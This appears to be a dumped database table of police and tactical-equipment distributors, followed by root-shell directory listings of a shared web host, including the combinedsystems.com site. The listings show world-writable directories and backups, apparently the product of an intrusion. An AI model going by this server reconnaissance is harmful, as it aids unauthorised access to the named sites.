+|                                   |                 |      365 |     | http://maps.google.com/maps?q=sherburnes,+llc+349+south+shelburne+road,+greenfield+ma+01203&hl=en&sll=37.0625,-95.677068&sspn=57.249013,134.912109&vpsrc=0&hq=sherburnes,+llc+349+south+shelburne+road,+greenfield&hnear=Pittsfield,+Massachusetts+01203&t | Sherburne, LLC                                     | (800) 628-3024         | NH    |                                                                                                     |                       |          | Distributor |        1 |                  |
+|                                   |                 |      366 |     | http://maps.google.com/maps?q=sherburnes,+llc+349+south+shelburne+road,+greenfield+ma+01203&hl=en&sll=37.0625,-95.677068&sspn=57.249013,134.912109&vpsrc=0&hq=sherburnes,+llc+349+south+shelburne+road,+greenfield&hnear=Pittsfield,+Massachusetts+01203&t | Sherburne, LLC                                     | (800) 628-3024         | RI    |                                                                                                     |                       |          | Distributor |        1 |                  |
+|                                   |                 |      367 |     | http://maps.google.com/maps?q=sherburnes,+llc+349+south+shelburne+road,+greenfield+ma+01203&hl=en&sll=37.0625,-95.677068&sspn=57.249013,134.912109&vpsrc=0&hq=sherburnes,+llc+349+south+shelburne+road,+greenfield&hnear=Pittsfield,+Massachusetts+01203&t | Sherburne, LLC                                     | (800) 628-3204         | VT    |                                                                                                     |                       |          | Distributor |        1 |                  |
+|                                   |                 |      368 |     | http://maps.google.com/maps?q=rosens+uniforms&hl=en&sqi=2&hq=rosens+uniforms&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                 | Rosens Uniforms & Tactical Gear                    | (800) 434-1376         | CT    | http://www.rosensuniforms.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      369 |     | http://maps.google.com/maps?q=rosens+uniforms&hl=en&sqi=2&hq=rosens+uniforms&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                 | Rosens Uniforms & Tactical Gear                    | (800) 434-1376         | ME    | http://www.rosensuniforms.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      370 |     | http://maps.google.com/maps?q=rosens+uniforms&hl=en&sqi=2&hq=rosens+uniforms&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                 | Rosens Uniforms & Tactical Gear                    | (800) 434-1376         | MA    | http://www.rosensuniforms.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      371 |     | http://maps.google.com/maps?q=rosens+uniforms&hl=en&sqi=2&hq=rosens+uniforms&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                 | Rosens Uniforms & Tactical Gear                    | (800) 434-1376         | NH    | http://www.rosensuniforms.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      372 |     | http://maps.google.com/maps?q=rosens+uniforms&hl=en&sqi=2&hq=rosens+uniforms&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                 | Rosens Uniforms & Tactical Gear                    | (800) 434-1376         | RI    | http://www.rosensuniforms.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      373 |     | http://maps.google.com/maps?q=rosens+uniforms&hl=en&sqi=2&hq=rosens+uniforms&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                 | Rosens Uniforms & Tactical Gear                    | (800) 434-1376         | VT    | http://www.rosensuniforms.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      374 |     | http://maps.google.com/maps?q=witmer+public+safety&hl=en&sqi=2&hq=witmer+public+safety&hnear=Coatesville,+Chester,+Pennsylvania&t=m&z=13&vpsrc=0                                                                                                           | Witmer Public Safety Group, Inc.                   | (800) 852-6088         | CT    | http://www.thefirestore.com/                                                                        |                       |          | Distributor |        1 |                  |
+|                                   |                 |      375 |     | http://maps.google.com/maps?q=witmer+public+safety&hl=en&sqi=2&hq=witmer+public+safety&hnear=Coatesville,+Chester,+Pennsylvania&t=m&z=13&vpsrc=0                                                                                                           | Witmer Public Safety Group, Inc.                   | (800) 852-6088         | ME    | http://www.thefirestore.com/                                                                        |                       |          | Distributor |        1 |                  |
+|                                   |                 |      376 |     | http://maps.google.com/maps?q=witmer+public+safety&hl=en&sqi=2&hq=witmer+public+safety&hnear=Coatesville,+Chester,+Pennsylvania&t=m&z=13&vpsrc=0                                                                                                           | Witmer Public Safety Group, Inc.                   | (800) 852-6088         | MA    | http://www.thefirestore.com/                                                                        |                       |          | Distributor |        1 |                  |
+|                                   |                 |      377 |     | http://maps.google.com/maps?q=witmer+public+safety&hl=en&sqi=2&hq=witmer+public+safety&hnear=Coatesville,+Chester,+Pennsylvania&t=m&z=13&vpsrc=0                                                                                                           | Witmer Public Safety Group, Inc.                   | (800) 852-6088         | NH    | http://www.thefirestore.com/                                                                        |                       |          | Distributor |        1 |                  |
+|                                   |                 |      378 |     | http://maps.google.com/maps?q=witmer+public+safety&hl=en&sqi=2&hq=witmer+public+safety&hnear=Coatesville,+Chester,+Pennsylvania&t=m&z=13&vpsrc=0                                                                                                           | Witmer Public Safety Group, Inc.                   | (800) 852-6088         | RI    | http://www.thefirestore.com/                                                                        |                       |          | Distributor |        1 |                  |
+|                                   |                 |      379 |     | http://maps.google.com/maps?q=witmer+public+safety&hl=en&sqi=2&hq=witmer+public+safety&hnear=Coatesville,+Chester,+Pennsylvania&t=m&z=13&vpsrc=0                                                                                                           | Witmer Public Safety Group, Inc.                   | (800) 852-6088         | VT    | http://www.thefirestore.com/                                                                        |                       |          | Distributor |        1 |                  |
+| 23 Denton Avenue                  | New Hyde Park   |      425 |     | http://maps.google.com/maps?q=hamburger+woolen&hl=en&sqi=2&hq=hamburger+woolen&hnear=New+Hyde+Park,+Nassau,+New+York&t=m&z=14                                                                                                                              | Hamburger Woolen Company, Inc. (Handcuffs & Restra | (866) 332-1899         | NY    | http://www.hwcny.com/                                                                               | 11040                 |          | Distributor |        1 |                  |
+|                                   |                 |      381 |     | http://maps.google.com/maps?q=Tactical+%26+Survival+Specialties,+Inc.,+Early+Road,+Harrisonburg,+VA&hl=en&sll=38.423303,-78.888768&sspn=0.090644,0.146942&oq=tactical+%26+survival+specialties+inc+&vpsrc=0&hq=Tactical+%26+Survival+Specialties,+Inc.,&hn | Tactical & Survival Specialties, Inc.              | (540) 434-8974         | CT    | http://www.tssi-ops.com/                                                                            |                       |          | Distributor |        1 |                  |
+|                                   |                 |      382 |     | http://maps.google.com/maps?q=Tactical+%26+Survival+Specialties,+Inc.,+Early+Road,+Harrisonburg,+VA&hl=en&sll=38.423303,-78.888768&sspn=0.090644,0.146942&oq=tactical+%26+survival+specialties+inc+&vpsrc=0&hq=Tactical+%26+Survival+Specialties,+Inc.,&hn | Tactical & Survival Specialties, Inc.              | (540) 434-8974         | ME    | http://www.tssi-ops.com/                                                                            |                       |          | Distributor |        1 |                  |
+|                                   |                 |      383 |     | http://maps.google.com/maps?q=Tactical+%26+Survival+Specialties,+Inc.,+Early+Road,+Harrisonburg,+VA&hl=en&sll=38.423303,-78.888768&sspn=0.090644,0.146942&oq=tactical+%26+survival+specialties+inc+&vpsrc=0&hq=Tactical+%26+Survival+Specialties,+Inc.,&hn | Tactical & Survival Specialties, Inc.              | (540) 434-8974         | MA    | http://www.tssi-ops.com/                                                                            |                       |          | Distributor |        1 |                  |
+|                                   |                 |      384 |     | http://maps.google.com/maps?q=Tactical+%26+Survival+Specialties,+Inc.,+Early+Road,+Harrisonburg,+VA&hl=en&sll=38.423303,-78.888768&sspn=0.090644,0.146942&oq=tactical+%26+survival+specialties+inc+&vpsrc=0&hq=Tactical+%26+Survival+Specialties,+Inc.,&hn | Tactical & Survival Specialties, Inc.              | (540) 434-8974         | NH    | http://www.tssi-ops.com/                                                                            |                       |          | Distributor |        1 |                  |
+|                                   |                 |      385 |     | http://maps.google.com/maps?q=Tactical+%26+Survival+Specialties,+Inc.,+Early+Road,+Harrisonburg,+VA&hl=en&sll=38.423303,-78.888768&sspn=0.090644,0.146942&oq=tactical+%26+survival+specialties+inc+&vpsrc=0&hq=Tactical+%26+Survival+Specialties,+Inc.,&hn | Tactical & Survival Specialties, Inc.              | (540) 434-8974         | RI    | http://www.tssi-ops.com/                                                                            |                       |          | Distributor |        1 |                  |
+|                                   |                 |      386 |     | http://maps.google.com/maps?q=Tactical+%26+Survival+Specialties,+Inc.,+Early+Road,+Harrisonburg,+VA&hl=en&sll=38.423303,-78.888768&sspn=0.090644,0.146942&oq=tactical+%26+survival+specialties+inc+&vpsrc=0&hq=Tactical+%26+Survival+Specialties,+Inc.,&hn | Tactical & Survival Specialties, Inc.              | (540) 434-8974         | VT    | http://www.tssi-ops.com/                                                                            |                       |          | Distributor |        1 |                  |
+|                                   |                 |      387 |     | http://maps.google.com/maps?q=Tactical+%26+Survival+Specialties,+Inc.,+Early+Road,+Harrisonburg,+VA&hl=en&sll=38.423303,-78.888768&sspn=0.090644,0.146942&oq=tactical+%26+survival+specialties+inc+&vpsrc=0&hq=Tactical+%26+Survival+Specialties,+Inc.,&hn | Tactical & Survival Specialties, Inc.              | (540) 434-8974         | WV    | http://www.tssi-ops.com/                                                                            |                       |          | Distributor |        1 |                  |
+|                                   |                 |      388 |     | http://maps.google.com/maps?q=lawmen+supply&hl=en&hq=lawmen+supply&hnear=Egg+Harbor+City,+Atlantic,+New+Jersey&t=m&z=13&vpsrc=0                                                                                                                            | Lawmen Supply Company                              | (609) 965-7307         | DC    | http://www.lawmensupply.com/                                                                        |                       |          | Distributor |        1 |                  |
+|                                   |                 |      389 |     | http://maps.google.com/maps?q=firing+line+philadelphia&hl=en&hq=firing+line&hnear=Philadelphia,+Pennsylvania&t=m&z=13&vpsrc=0                                                                                                                              | Firing Line, Inc                                   | (215) 336-1710         | MD    | http://www.firinglineinc.com/                                                                       |                       |          | Distributor |        1 |                  |
+|                                   |                 |      390 |     | http://maps.google.com/maps?q=firing+line+philadelphia&hl=en&hq=firing+line&hnear=Philadelphia,+Pennsylvania&t=m&z=13&vpsrc=0                                                                                                                              | Firing Line, Inc.                                  | (215) 336-1710         | DE    | http://www.firinglineinc.com/                                                                       |                       |          | Distributor |        1 |                  |
+|                                   |                 |      392 |     | http://maps.google.com/maps?q=dana+safety+supply&hl=en&hq=dana+safety+supply&hnear=Greensboro,+Guilford,+North+Carolina&t=m&z=12&vpsrc=0                                                                                                                   | Dana Safety Supply                                 | (336) 854-5536         | FL    | http://www.danasafetysupply.com/                                                                    |                       |          | Distributor |        1 |                  |
+|                                   |                 |      393 |     | http://maps.google.com/maps?q=dana+safety+supply&hl=en&hq=dana+safety+supply&hnear=Greensboro,+Guilford,+North+Carolina&t=m&z=12&vpsrc=0                                                                                                                   | Dana Safety Supply                                 | (336) 854-5536         | GA    | http://www.danasafetysupply.com/                                                                    |                       |          | Distributor |        1 |                  |
+|                                   |                 |      394 |     | http://maps.google.com/maps?q=dana+safety+supply&hl=en&hq=dana+safety+supply&hnear=Greensboro,+Guilford,+North+Carolina&t=m&z=12&vpsrc=0                                                                                                                   | Dana Safety Supply                                 | (336) 854-5536         | SC    | http://www.danasafetysupply.com/                                                                    |                       |          | Distributor |        1 |                  |
+|                                   |                 |      422 |     | http://maps.google.com/maps?q=extreme+products&hl=en&sqi=2&hq=extreme+products&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                               | Extreme Products, LLC                              | (503) 657-4806         | AK    | http://www.extreme-products.net/                                                                    |                       |          | Distributor |        1 |                  |
+|                                   |                 |      396 |     | http://maps.google.com/maps?q=omb+guns&hl=en&hq=omb+guns&hnear=Olathe,+Johnson,+Kansas&t=m&z=12&vpsrc=0                                                                                                                                                    | OMB Guns                                           | (913) 322-8412         | IA    | http://www.ombguns.com/                                                                             |                       |          | Distributor |        1 |                  |
+|                                   |                 |      397 |     | http://maps.google.com/maps?q=omb+guns&hl=en&hq=omb+guns&hnear=Olathe,+Johnson,+Kansas&t=m&z=12&vpsrc=0                                                                                                                                                    | OMB Guns                                           | (913) 322-8412         | MN    | http://www.ombguns.com/                                                                             |                       |          | Distributor |        1 |                  |
+|                                   |                 |      398 |     | http://maps.google.com/maps?q=omb+guns&hl=en&hq=omb+guns&hnear=Olathe,+Johnson,+Kansas&t=m&z=12&vpsrc=0                                                                                                                                                    | OMB Guns                                           | (913) 322-8412         | MO    | http://www.ombguns.com/                                                                             |                       |          | Distributor |        1 |                  |
+|                                   |                 |      399 |     | http://maps.google.com/maps?q=omb+guns&hl=en&hq=omb+guns&hnear=Olathe,+Johnson,+Kansas&t=m&z=12&vpsrc=0                                                                                                                                                    | OMB Guns                                           | (913) 322-8412         | NE    | http://www.ombguns.com/                                                                             |                       |          | Distributor |        1 |                  |
+|                                   |                 |      400 |     | http://maps.google.com/maps?q=srt+supply&hl=en&hq=srt+supply&hnear=St.+Petersburg,+Pinellas,+Florida&t=m&z=12&vpsrc=0                                                                                                                                      | SRT Supply, Inc.                                   | (727) 526-5451         | GA    | http://www.srtsupply.com/                                                                           |                       |          | Distributor |        1 |                  |
+|                                   |                 |      401 |     | http://maps.google.com/maps?q=blumenthal+uniforms&hl=en&hq=blumenthal+uniforms&hnear=Portland,+Multnomah,+Oregon&t=m&z=11&vpsrc=0                                                                                                                          | Blumenthal Uniforms & Equipment                    | (503) 452-5055         | ID    | http://www.blumenthaluniforms.com/                                                                  |                       |          | Distributor |        1 |                  |
+|                                   |                 |      402 |     | http://maps.google.com/maps?q=blumenthal+uniforms&hl=en&hq=blumenthal+uniforms&hnear=Portland,+Multnomah,+Oregon&t=m&z=11&vpsrc=0                                                                                                                          | Blumenthal Uniforms & Equipment                    | (503) 452-5055         | WA    | http://www.blumenthaluniforms.com/                                                                  |                       |          | Distributor |        1 |                  |
+|                                   |                 |      403 |     | http://maps.google.com/maps?q=kiesler+police+supply&hl=en&hq=kiesler+police+supply&hnear=Jeffersonville,+Clark,+Indiana&t=m&z=12&vpsrc=0                                                                                                                   | Kiesler Police Supply, Inc.                        | (812) 288-5740         | KY    | http://www.kiesler.com/                                                                             |                       |          | Distributor |        1 |                  |
+|                                   |                 |      404 |     | http://maps.google.com/maps?q=kiesler+supply&hl=en&sqi=2&hq=kiesler+supply&radius=15000&t=m&z=16                                                                                                                                                           | Kiesler Police Supply, Inc.                        | (812) 288-5740         | OH    | http://www.kiesler.com/                                                                             |                       |          | Distributor |        1 |                  |
+|                                   |                 |      405 |     | http://maps.google.com/maps?q=gulf+state+distributors+inc&hl=en&hq=gulf+state+distributors+inc&hnear=Montgomery,+Alabama&t=m&z=12&vpsrc=0                                                                                                                  | Gulf State Distributors                            | (334) 271-2011         | LA    | http://www.gulfstatesdist.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      406 |     | http://maps.google.com/maps?q=gulf+state+distributors+inc&hl=en&hq=gulf+state+distributors+inc&hnear=Montgomery,+Alabama&t=m&z=12&vpsrc=0                                                                                                                  | Gulf States Distributors                           | (334) 271-2011 () â€Ž    | MS    | http://www.gulfstatesdist.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      407 |     | http://maps.google.com/maps?q=gulf+state+distributors+inc&hl=en&hq=gulf+state+distributors+inc&hnear=Montgomery,+Alabama&t=m&z=12&vpsrc=0&iwloc=A                                                                                                          | Gulf States Distributors                           | (334) 271-2011 ()      | TN    | http://www.gulfstatesdist.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      408 |     | http://maps.google.com/maps?q=advantage+police+supply&hl=en&hq=advantage+police+supply&hnear=Oshkosh,+Winnebago,+Wisconsin&t=m&z=12&vpsrc=0&iwloc=A                                                                                                        | Advantage Police Supply                            | (920) 235-6003         | MN    | http://www.advantagepolice-supply.com/Index.htm                                                     |                       |          | Distributor |        1 |                  |
+|                                   |                 |      409 |     | http://maps.google.com/maps?q=big+country+supply&hl=en&hq=big+country+supply&hnear=Abilene,+Taylor,+Texas&t=m&z=13&vpsrc=0&iwloc=A                                                                                                                         | Big Country Supply                                 | (325) 698-1683         | OK    | http://www.bigcountrysupply.com/                                                                    |                       |          | Distributor |        1 |                  |
+|                                   |                 |      410 |     | http://maps.google.com/maps?q=1105+industry+rd+lexington+ky&hl=en&sqi=2&hnear=1105+Industry+Rd,+Lexington,+Kentucky+40505&t=m&z=16&vpsrc=0                                                                                                                 | Buds Police Supply                                 | (859) 368-0417         | TN    | http://www.budspolicesupply.com/catalog/index.php                                                   |                       |          | Distributor |        1 |                  |
+|                                   |                 |      411 |     | http://maps.google.com/maps?q=combat+cartridge+3042+chevlon+road,+overgaard+az+85933&hl=en&sll=37.0625,-95.677068&sspn=57.249013,134.912109&vpsrc=1&hq=combat+cartridge&hnear=3042+Chevlon+Rd,+Heber-Overgaard,+Navajo,+Arizona+85928&t=m&z=15&iwloc=A     | Combat Cartridge                                   | (928) 535-5615         | NM    |                                                                                                     |                       |          | Distributor |        1 |                  |
+|                                   |                 |      412 |     | http://maps.google.com/maps?q=farm+police+supply&hl=en&hq=farm+police+supply&hnear=Murray,+Salt+Lake,+Utah&t=m&z=14&vpsrc=0&iwloc=A                                                                                                                        | FARM Police Supply                                 | (801) 313-0802 () â€Ž    | WY    | http://farmpolicesupply.net/                                                                        |                       |          | Distributor |        1 |                  |
+|                                   |                 |      413 |     | http://maps.google.com/maps?q=neves+uniforms&hl=en&hq=neves+uniforms&hnear=Denver,+Colorado&t=m&z=12&vpsrc=0                                                                                                                                               | Neves Uniforms                                     | (303) 455-7000         | NM    | http://www.nevesuniforms.com/                                                                       |                       |          | Distributor |        1 |                  |
+|                                   |                 |      414 |     | http://maps.google.com/maps?q=neves+uniforms&hl=en&hq=neves+uniforms&hnear=Denver,+Colorado&t=m&z=12&vpsrc=0                                                                                                                                               | Neves Uniforms                                     | (303) 455-7000         | WY    | http://www.nevesuniforms.com/                                                                       |                       |          | Distributor |        1 |                  |
+|                                   |                 |      415 |     |                                                                                                                                                                                                                                                            | Operator Safety Solutions                          | (910) 774-9567         | SC    | http://ossops.com/index.html                                                                        |                       |          | Distributor |        1 |                  |
+|                                   |                 |      416 |     | http://maps.google.com/maps?q=ray+o\'herron+co&hl=en&hq=ray+o\'herron+co&hnear=Danville,+Vermilion,+Illinois&t=m&z=12&vpsrc=0                                                                                                                              | Ray OHerron Co., Inc.                              | (800) 223-2097         | MN    | http://www.oherron.com/                                                                             |                       |          | Distributor |        1 |                  |
+|                                   |                 |      417 |     | http://maps.google.com/maps?q=ray+o\'herron+co&hl=en&hq=ray+o\'herron+co&hnear=Danville,+Vermilion,+Illinois&t=m&z=12&vpsrc=0                                                                                                                              | Ray OHerron Co., Inc.                              | (800( 223-2097         | ND    | http://www.oherron.com/                                                                             |                       |          | Distributor |        1 |                  |
+|                                   |                 |      418 |     | http://maps.google.com/maps?q=ray+o\'herron+co&hl=en&hq=ray+o\'herron+co&hnear=Danville,+Vermilion,+Illinois&t=m&z=12&vpsrc=0                                                                                                                              | Ray OHerron, Co., Inc.                             | (800) 223-2097         | SD    | http://www.oherron.com/                                                                             |                       |          | Distributor |        1 |                  |
+|                                   |                 |      419 |     | http://maps.google.com/maps?q=shore+galleries&hl=en&hq=shore+galleries&hnear=Lincolnwood,+Cook,+Illinois&t=m&z=14&vpsrc=0                                                                                                                                  | Shore Galleries                                    | (847) 676-2900         | MN    | http://www.shoregalleries.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      420 |     | http://maps.google.com/maps?q=southern+police+equipment&hl=en&hq=southern+police+equipment&hnear=Richmond,+Virginia&t=m&z=12&vpsrc=0                                                                                                                       | Southern Police Equipment                          | (800) 542-5243         | WV    | http://www.southernpoliceequipment.com/                                                             |                       |          | Distributor |        1 |                  |
+|                                   |                 |      421 |     | http://maps.google.com/maps?q=all+state+police+equipment&hl=en&hq=all+state+police+equipment&hnear=Pomona,+Los+Angeles,+California&t=m&z=12&vpsrc=0                                                                                                        | All State Police Equipment, Co.                    | (800) 582-2294         | NV    | http://www.allstatepolice.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      428 |     | http://maps.google.com/maps?q=ray+o\'herron&hl=en&sqi=2&hq=ray+o\'herron&hnear=Lombard,+DuPage,+Illinois&t=m&z=13                                                                                                                                          | Ray OHerron Co., Inc.                              |                        | IA    | http://www.oherron.com/                                                                             |                       |          | Distributor |        1 |                  |
++-----------------------------------+-----------------+----------+-----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------+------------------------+-------+-----------------------------------------------------------------------------------------------------+-----------------------+----------+-------------+----------+------------------+
+
+# ls -al /var/www/vhosts
+total 180
+drwxrwxr-x 41 ftp ftp 4096 Feb  8 14:30 .
+drwxr-xr-x 11 ftp ftp 4096 Aug 20 11:57 ..
+-rwxrwxr-x  1 ftp ftp   90 Jun 17  2008 .htaccess
+-rwxr-xr-x  1 ftp ftp   81 Feb 16  2010 .samplehtaccess
+lrwxrwxrwx  1 ftp ftp   18 Sep 28  2009 69.30.233.88 -> www.yinrunning.com
+lrwxrwxrwx  1 ftp ftp   15 Nov 29 11:16 aeoniun.com -> www.aeoniun.com
+lrwxrwxrwx  1 ftp ftp   25 May 11  2011 alittlebirdbizdev.com -> www.alittlebirdbizdev.com
+drwxrwxrwx  4 ftp ftp 4096 Oct 23  2010 bak_SLS_10_23_2010
+drwxrwxrwx  6 ftp ftp 4096 Mar  3  2010 bo.tensquirrel.com
+lrwxrwxrwx  1 ftp ftp   23 Mar 25  2010 cambridgechurch.org -> www.cambridgechurch.org
+lrwxrwxrwx  1 ftp ftp   12 Apr  4  2011 cbts.edu -> www.cbts.edu
+lrwxrwxrwx  1 ftp ftp   29 Apr  5  2011 clinicalrisksolutions.com -> www.clinicalrisksolutions.com
+lrwxrwxrwx  1 ftp ftp   23 Sep 15 17:24 combinedsystems.com -> www.combinedsystems.com
+lrwxrwxrwx  1 ftp ftp   19 Apr 26  2009 cragarwheel.com -> www.cragarwheel.com
+lrwxrwxrwx  1 ftp ftp   29 Sep 22  2010 crs.tensquirrel.com -> www.clinicalrisksolutions.com
+lrwxrwxrwx  1 ftp ftp   23 Sep 17 00:28 csi.markbranding.com -> www.combinedsystems.com
+lrwxrwxrwx  1 ftp ftp   18 Apr  5  2011 dealers.dioaccessories.com -> dealers.gstdio.com
+drwxrwxrwx  4 ftp ftp 4096 Mar 15  2010 dealers.gstdio.com
+lrwxrwxrwx  1 ftp ftp   18 Aug 22 19:11 devin.tensquirrel.com -> www.devinwolfe.com
+lrwxrwxrwx  1 ftp ftp   18 Aug 22 19:11 devinwolfe.com -> www.devinwolfe.com
+lrwxrwxrwx  1 ftp ftp   14 Mar 10  2010 dioaccessories.com -> www.gstdio.com
+lrwxrwxrwx  1 ftp ftp   13 Mar 28  2011 dmi.tensquirrel.com -> www.dmikc.com
+lrwxrwxrwx  1 ftp ftp   13 Mar 28  2011 dmifloors.com -> www.dmikc.com
+lrwxrwxrwx  1 ftp ftp   13 Apr  5  2011 dmikc.com -> www.dmikc.com
+drwxrwxrwx  4 ftp ftp 4096 Jul  1  2010 dns.tensquirrel.com
+lrwxrwxrwx  1 ftp ftp   20 Dec 10  2010 dsto.markbranding.com -> dsto.tensquirrel.com
+drwxrwxrwx  4 ftp ftp 4096 Dec 10  2010 dsto.tensquirrel.com
+lrwxrwxrwx  1 ftp ftp   14 Apr  5  2011 gstdio.com -> www.gstdio.com
+lrwxrwxrwx  1 ftp ftp   23 Jan 13 16:50 handcuffsusa.com -> www.combinedsystems.com
+lrwxrwxrwx  1 ftp ftp   23 Jul 17  2009 hawleywoodfilms.com -> www.hawleywoodfilms.com
+drwxrwxrwx  4 ftp ftp 4096 Apr  8  2011 kwotez.tensquirrel.com
+lrwxrwxrwx  1 ftp ftp   23 Jan 13 16:50 less-lethal.com -> www.combinedsystems.com
+lrwxrwxrwx  1 ftp ftp   25 May 11  2011 lilbird.tensquirrel.com -> www.alittlebirdbizdev.com
+drwxr-xr-x  2 ftp ftp 4096 Aug 20 11:59 mail.tensquirrel.com
+lrwxrwxrwx  1 ftp ftp   20 Nov 14 18:16 markbranding.com -> www.markbranding.com
+lrwxrwxrwx  1 ftp ftp   17 Apr 15  2011 mehtaphor.com -> www.mehtaphor.com
+lrwxrwxrwx  1 ftp ftp   17 Apr 15  2011 mehtaphor.tensquirrel.com -> www.mehtaphor.com
+lrwxrwxrwx  1 ftp ftp   23 Apr 15  2011 milcahsolutions.com -> www.milcahsolutions.com
+lrwxrwxrwx  1 ftp ftp   23 Apr 15  2011 milcahsolutions.tensquirrel.com -> www.milcahsolutions.com
+lrwxrwxrwx  1 ftp ftp   22 Jul 10  2008 milesincdesign.com -> www.milesincdesign.com
+drwxrwxrwx  3 ftp ftp 4096 Apr  4  2011 mysql.tensquirrel.com
+-rwxrwx---  1 ftp ftp  466 Apr  5  2011 new
+drwxr-xr-x  4 ftp ftp 4096 Apr 20  2010 new.markbranding.com
+lrwxrwxrwx  1 ftp ftp   23 Jan 13 16:50 pennarms.com -> www.combinedsystems.com
+lrwxrwxrwx  1 ftp ftp   21 Mar 16  2010 petitepawsbnb.com -> www.petitepawsbnb.com
+lrwxrwxrwx  1 ftp ftp   18 Sep 17 11:40 plusovella.com -> www.plusovella.com
+lrwxrwxrwx  1 ftp ftp   31 Apr  5  2011 signlanguagespecialists.com -> www.signlanguagespecialists.com
+drwxrwxrwx  4 ftp ftp 4096 Jun 16  2010 sls.tensquirrel.com
+lrwxrwxrwx  1 ftp ftp   19 Oct  5  2010 sls.yinrunning.com -> sls.tensquirrel.com
+drwxr-xr-x  4 ftp ftp 4096 Oct 14  2009 squirrel.tensquirrel.com
+lrwxrwxrwx  1 ftp ftp   29 Nov  2  2009 sumrallcommunications.com -> www.sumrallcommunications.com
+lrwxrwxrwx  1 ftp ftp   15 Apr  5  2011 sur-tec.com -> www.sur-tec.com
+lrwxrwxrwx  1 ftp ftp   15 Mar 26  2011 surtec.markbranding.com -> www.sur-tec.com
+lrwxrwxrwx  1 ftp ftp   19 Sep 29  2009 tensquirrel.com -> www.tensquirrel.com
+-rwxrwxrwx  1 ftp ftp    1 Mar 16  2010 txt.txt
+drwxrwxrwx  4 ftp ftp 4096 Feb  8 14:30 voltage.tensquirrel.com
+drwxrwxrwx  4 ftp ftp 4096 May 17  2010 webmail.tensquirrel.com
+drwxrwxrwx  5 ftp ftp 4096 Jun 16  2011 work.yinrunning.com
+drwxr-xr-x  4 ftp ftp 4096 Nov  2 14:04 workshop.tensquirrel.com
+drwxrwxrwx  4 ftp ftp 4096 Nov 29 11:16 www.aeoniun.com
+drwxrwxrwx  4 ftp ftp 4096 May 11  2011 www.alittlebirdbizdev.com
+drwxrwxrwx  4 ftp ftp 4096 Sep  6 10:49 www.cambridgechurch.org
+drwxrwxrwx  4 ftp ftp 4096 Sep  2  2009 www.cambridgechurch.org~
+drwxrwxrwx  4 ftp ftp 4096 May  9  2011 www.cbts.edu
+drwxrwxrwx  4 ftp ftp 4096 Sep 22  2010 www.clinicalrisksolutions.com
+drwxrwxrwx  4 ftp ftp 4096 Feb 10 18:54 www.combinedsystems.com
+drwxrwxrwx  4 ftp ftp 4096 Jul  6  2009 www.cragarwheel.com
+drwxrwxrwx  4 ftp ftp 4096 Aug 22 19:11 www.devinwolfe.com
+lrwxrwxrwx  1 ftp ftp   14 Mar 10  2010 www.dioaccessories.com -> www.gstdio.com
+lrwxrwxrwx  1 ftp ftp   13 Mar 28  2011 www.dmifloors.com -> www.dmikc.com
+drwxrwxrwx  4 ftp ftp 4096 Mar 28  2011 www.dmikc.com
+drwxrwxrwx  4 ftp ftp 4096 Mar 10  2010 www.gstdio.com
+lrwxrwxrwx  1 ftp ftp   23 Jan 13 16:50 www.handcuffsusa.com -> www.combinedsystems.com
+drwxrwxrwx  4 ftp ftp 4096 Jan 28  2010 www.hawleywoodfilms.com
+drwxrwxrwx  5 ftp ftp 4096 Nov 11  2009 www.hawleywoodfilms.com~
+lrwxrwxrwx  1 ftp ftp   23 Jan 13 16:50 www.less-lethal.com -> www.combinedsystems.com
+drwxrwxrwx  4 ftp ftp 4096 Oct  1 13:47 www.markbranding.com
+drwxrwxrwx  4 ftp ftp 4096 Apr 15  2011 www.mehtaphor.com
+drwxrwxrwx  4 ftp ftp 4096 Apr 15  2011 www.milcahsolutions.com
+drwxrwxrwx  3 ftp ftp 4096 Feb 14  2009 www.milesincdesign.com
+lrwxrwxrwx  1 ftp ftp   23 Jan 13 16:50 www.pennarms.com -> www.combinedsystems.com
+drwxrwxrwx  4 ftp ftp 4096 Mar 16  2010 www.petitepawsbnb.com
+drwxrwxrwx  4 ftp ftp 4096 Sep 17 11:40 www.plusovella.com
+drwxrwxrwx  4 ftp ftp 4096 Jun 16  2010 www.signlanguagespecialists.com
+drwxrwxrwx  4 ftp ftp 4096 Oct 30  2009 www.sumrallcommunications.com
+drwxrwxrwx  4 ftp ftp 4096 Oct 12 18:04 www.sur-tec.com
+drwxr-xr-x  4 ftp ftp 4096 Mar  1  2010 www.tensquirrel.com
+drwxrwxrwx  5 ftp ftp 4096 Jun 18  2009 www.yinrunning.com
+lrwxrwxrwx  1 ftp ftp   18 Jun  4  2008 yinrunning.com -> www.yinrunning.com
+
+# cd /var/www/vhosts/combinedsystems.com/docroot; ls -al
+total 164
+drwxrwxrwx 23 ftp ftp  4096 Feb 13 19:57 .
+drwxrwxrwx  4 ftp ftp  4096 Feb 10 18:54 ..
+-rwxrwxrwx  1 ftp ftp    95 Sep 15 17:24 .htaccess
+drwxr-xr-x  2 ftp ftp  4096 Sep 16 15:52 _css
+drwxr-xr-x  3 ftp ftp  4096 Jan 13 10:46 _img
+drwxr-xr-x  3 ftp ftp  4096 Sep 16 15:53 _inc~
+drwxr-xr-x  3 ftp ftp  4096 Sep 16 15:53 _js
+drwxrwxr-x  4 ftp ftp  4096 Feb 10 12:12 _pdf
+drwxr-xr-x  2 ftp ftp  4096 Oct 31 11:11 cart
